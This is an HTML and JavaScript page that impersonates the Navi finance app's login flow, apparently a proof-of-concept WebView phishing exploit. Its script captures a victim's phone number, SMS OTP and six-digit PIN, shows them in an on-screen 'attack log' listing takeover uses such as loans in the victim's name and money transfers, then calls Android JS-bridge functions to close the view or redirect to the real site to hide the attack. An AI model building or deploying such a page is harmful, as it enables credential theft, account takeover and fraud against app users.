<!DOCTYPE html>
<html>
<head>
    <title>Navi - Login</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; padding: 20px; background: #f8f9fa; }
        .app-container { max-width: 400px; margin: 0 auto; }
        .screen { background: white; border-radius: 16px; padding: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); margin-bottom: 20px; display: none; }
        .screen.active { display: block; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo-circle { width: 60px; height: 60px; background: #4a6ee0; border-radius: 12px; margin: 0 auto 15px; }
        .input-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
        input { width: 100%; padding: 16px; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 16px; background: #4a6ee0; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:disabled { background: #ccc; }
        .otp-container { display: flex; gap: 10px; margin-bottom: 20px; }
        .otp-box { flex: 1; height: 60px; text-align: center; font-size: 24px; border: 1px solid #ddd; border-radius: 10px; }
        .attack-log { background: #000; color: #0f0; padding: 20px; border-radius: 10px; font-family: monospace; font-size: 13px; margin-top: 20px; display: none; }
        .step-indicator { display: flex; justify-content: center; margin: 30px 0; }
        .step { width: 8px; height: 8px; background: #ddd; border-radius: 50%; margin: 0 4px; }
        .step.active { background: #4a6ee0; }
    </style>
</head>
<body>
    <div class="app-container">
        <!-- SCREEN 1: PHONE NUMBER -->
        <div id="screen1" class="screen active">
            <div class="logo">
                <div class="logo-circle"></div>
                <h2>Navi</h2>
                <p style="color: #666; margin-top: 5px;">UPI ‚Ä¢ Loans ‚Ä¢ Insurance</p>
            </div>
            
            <div class="input-group">
                <label>Enter Mobile Number</label>
                <input type="tel" id="phone" placeholder="10-digit mobile number" maxlength="10" pattern="[0-9]{10}">
            </div>
            
            <p style="color: #666; font-size: 14px; margin-bottom: 20px;">
                By continuing, you agree to our <a href="#" style="color: #4a6ee0;">Terms & Conditions</a>
            </p>
            
            <button id="continueBtn">Continue</button>
            
            <div class="step-indicator">
                <div class="step active"></div>
                <div class="step"></div>
                <div class="step"></div>
            </div>
        </div>
        
        <!-- SCREEN 2: OTP -->
        <div id="screen2" class="screen">
            <div class="logo">
                <div class="logo-circle"></div>
                <h3>Enter OTP</h3>
                <p id="otpSentTo" style="color: #666;">Sent to +91 XXXXXXX890</p>
            </div>
            
            <div class="otp-container">
                <input type="text" maxlength="1" class="otp-box" id="otp1">
                <input type="text" maxlength="1" class="otp-box" id="otp2">
                <input type="text" maxlength="1" class="otp-box" id="otp3">
                <input type="text" maxlength="1" class="otp-box" id="otp4">
                <input type="text" maxlength="1" class="otp-box" id="otp5">
                <input type="text" maxlength="1" class="otp-box" id="otp6">
            </div>
            
            <p style="text-align: center; color: #666; margin: 20px 0;">
                <span id="timer">00:30</span> ‚Ä¢ <a href="#" onclick="resendOTP()" style="color: #4a6ee0;">Resend OTP</a>
            </p>
            
            <button id="verifyOtpBtn">Verify OTP</button>
            
            <div class="step-indicator">
                <div class="step"></div>
                <div class="step active"></div>
                <div class="step"></div>
            </div>
        </div>
        
        <!-- SCREEN 3: SET PIN -->
        <div id="screen3" class="screen">
            <div class="logo">
                <div class="logo-circle"></div>
                <h3>Set Your PIN</h3>
                <p style="color: #666;">Create a 6-digit PIN for secure login</p>
            </div>
            
            <div class="input-group">
                <label>Enter 6-digit PIN</label>
                <input type="password" id="pin" placeholder="Create PIN" maxlength="6" pattern="[0-9]{6}">
            </div>
            
            <div class="input-group">
                <label>Confirm PIN</label>
                <input type="password" id="confirmPin" placeholder="Re-enter PIN" maxlength="6">
            </div>
            
            <button id="setPinBtn">Set PIN & Complete</button>
            
            <div class="step-indicator">
                <div class="step"></div>
                <div class="step"></div>
                <div class="step active"></div>
            </div>
        </div>
        
        <!-- ATTACK LOG -->
        <div class="attack-log" id="attackLog">
            <strong>ATTACK PROGRESSION:</strong><br>
            <div id="log"></div>
        </div>
    </div>

    <script>
        // ATTACK STATE
        let capturedData = {
            phone: '',
            otp: '',
            pin: ''
        };
        
        // DOM Elements
        const screens = {
            phone: document.getElementById('screen1'),
            otp: document.getElementById('screen2'),
            pin: document.getElementById('screen3')
        };
        
        const attackLog = document.getElementById('attackLog');
        const logContent = document.getElementById('log');
        
        // ====================
        // SCREEN 1: PHONE CAPTURE
        // ====================
        document.getElementById('continueBtn').addEventListener('click', function() {
            const phone = document.getElementById('phone').value.trim();
            
            if (phone.length !== 10 || !/^\d+$/.test(phone)) {
                alert('Please enter valid 10-digit mobile number');
                return;
            }
            
            // CAPTURE PHONE
            capturedData.phone = phone;
            addLog(`[1/3] üì± CAPTURED: Phone number: ${phone}`);
            
            // Show attack log
            attackLog.style.display = 'block';
            
            // Update OTP screen message
            document.getElementById('otpSentTo').textContent = `Sent to +91 ${phone.substring(0, 3)}XXXX${phone.substring(7)}`;
            
            // Switch to OTP screen
            screens.phone.classList.remove('active');
            screens.otp.classList.add('active');
            
            // Focus first OTP box
            document.getElementById('otp1').focus();
        });
        
        // ====================
        // SCREEN 2: OTP CAPTURE
        // ====================
        const otpBoxes = ['otp1','otp2','otp3','otp4','otp5','otp6'].map(id => document.getElementById(id));
        
        // OTP input handling
        otpBoxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                if (e.target.value && index < 5) {
                    otpBoxes[index + 1].focus();
                }
                
                // Check if all OTP entered
                const otp = otpBoxes.map(b => b.value).join('');
                if (otp.length === 6) {
                    document.getElementById('verifyOtpBtn').focus();
                }
            });
            
            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !box.value && index > 0) {
                    otpBoxes[index - 1].focus();
                }
            });
        });
        
        document.getElementById('verifyOtpBtn').addEventListener('click', function() {
            const otp = otpBoxes.map(b => b.value).join('');
            
            if (otp.length !== 6) {
                alert('Please enter 6-digit OTP');
                return;
            }
            
            // CAPTURE OTP
            capturedData.otp = otp;
            addLog(`[2/3] üîë CAPTURED: OTP: ${otp}`);
            addLog(`   ‚Üí Attacker can now verify this OTP with real Navi`);
            
            // Switch to PIN screen
            screens.otp.classList.remove('active');
            screens.pin.classList.add('active');
            
            // Focus PIN input
            document.getElementById('pin').focus();
        });
        
        // ====================
        // SCREEN 3: PIN CAPTURE
        // ====================
        document.getElementById('setPinBtn').addEventListener('click', function() {
            const pin = document.getElementById('pin').value.trim();
            const confirmPin = document.getElementById('confirmPin').value.trim();
            
            if (pin.length !== 6 || !/^\d+$/.test(pin)) {
                alert('Please enter valid 6-digit PIN');
                return;
            }
            
            if (pin !== confirmPin) {
                alert('PINs do not match');
                return;
            }
            
            // CAPTURE PIN
            capturedData.pin = pin;
            addLog(`[3/3] üí≥ CAPTURED: PIN: ${pin}`);
            addLog(`‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê`);
            addLog(`üéØ ATTACK COMPLETE!`);
            addLog(`üìä CAPTURED DATA:`);
            addLog(`   ‚Ä¢ Phone: ${capturedData.phone}`);
            addLog(`   ‚Ä¢ OTP: ${capturedData.otp}`);
            addLog(`   ‚Ä¢ PIN: ${capturedData.pin}`);
            addLog(`‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê`);
            addLog(`‚ö° ATTACKER CAN NOW:`);
            addLog(`   1. Login to real Navi as victim`);
            addLog(`   2. Apply for loans in victim's name`);
            addLog(`   3. Transfer money from victim's account`);
            addLog(`   4. Change security settings`);
            
            // Disable button
            this.disabled = true;
            this.textContent = '‚úì Account Secured';
            this.style.background = '#2e7d32';
            
            // Use JS bridge to hide evidence
            setTimeout(() => {
                if (typeof Android !== 'undefined') {
                    addLog(`\nüö® JS BRIDGE EXPLOITATION:`);
                    
                    // Close WebView
                    if (Android.closeView) {
                        addLog(`   Closing WebView to hide attack...`);
                        setTimeout(() => Android.closeView(), 2000);
                    }
                    
                    // Or redirect to real Navi
                    if (Android.openLink) {
                        setTimeout(() => {
                            Android.openLink('https://naviapp.com');
                            addLog(`   Redirecting to legitimate Navi site`);
                        }, 1000);
                    }
                }
            }, 1500);
        });
        
        // ====================
        // HELPER FUNCTIONS
        // ====================
        function addLog(message) {
            logContent.innerHTML += message + '<br>';
            console.log(message);
            logContent.scrollTop = logContent.scrollHeight;
        }
        
        function resendOTP() {
            addLog(`üì≤ Fake OTP resent to ${capturedData.phone}`);
            alert('OTP has been resent to your mobile');
            resetTimer();
        }
        
        // Timer for OTP
        let timeLeft = 30;
        function updateTimer() {
            if (timeLeft > 0) {
                timeLeft--;
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                document.getElementById('timer').textContent = 
                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            }
        }
        
        function resetTimer() {
            timeLeft = 30;
            document.getElementById('timer').textContent = '00:30';
        }
        
        setInterval(updateTimer, 1000);
        
        // Initial log
        setTimeout(() => {
            addLog('üíÄ Navi WebView Exploit Loaded');
            addLog('This mimics real Navi login flow to capture:');
            addLog('1. Phone number');
            addLog('2. OTP (SMS)');
            addLog('3. 6-digit PIN');
            addLog('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
        }, 500);
    </script>
</body>
</html>